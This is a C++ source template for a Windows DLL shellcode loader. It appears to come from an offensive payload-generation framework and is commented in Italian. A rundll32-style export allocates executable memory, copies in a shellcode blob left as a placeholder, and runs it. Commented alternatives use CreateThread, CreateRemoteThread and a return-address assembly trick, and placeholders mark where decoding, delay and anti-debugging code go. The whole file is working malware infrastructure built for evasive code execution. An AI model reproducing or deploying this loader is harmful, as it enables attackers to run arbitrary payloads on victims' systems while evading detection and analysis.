// Bison.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//
#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//####USING####

//####DEFINE####

//####CODE####

extern "C" __declspec(dllexport) void CALLBACK PsychoBlastEP(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

DWORD WINAPI PsychoBlast(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = ####SHELLCODE####;
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    SIZE_T bytesWritten;

    //####CALL####

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    
    // Method 1: No process Specified 
    VOID* mem = VirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);

    // Method 2: Specifying current process 
    //VOID* mem = VirtualAllocEx(currentProcess, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_READWRITE);
    if (mem == NULL)
        return -1;
    VirtualProtect(mem, length, 0x40, &dwSize);

    bool success = false;
    // Method 1: No process Specified 
    success = memcpy(mem, decoded, length);

    // Method 2: Specifying current process 
    // success = WriteProcessMemory(currentProcess, mem, decoded, length, &bytesWritten);
    if (!success)
        return -2;

    printf("[*] Executing\n");
    // Method 1: No process Specified, using function pointer
    // With no params, this definition would be good as well
    ((void(*)())mem)();

    // Method 2: No process specified, using CreateThread
    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    // Method 3: Specifying current process
    //CreateRemoteThread(currentProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    /* Method 4: Using Assembly to manipulate return address
    * 1. MOV &mem RCX ---> Store mem on RCX
    * 2. PUSH RCX     ---> Push mem on the stack
    * 3. RET          ---> mem is now in RIP, and gets executed
    asm volatile ("mov %0, %%rcx\n\t"
        "push %%rcx\n\t"
        "ret"
        :
    : "r" (mem));
    */
    printf("[+] The shellcode finished\n");
    return 0;
}

void CALLBACK PsychoBlastEP(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    //####DELAY####
    //####ANTIDEBUG####
    PsychoBlast(NULL);
}

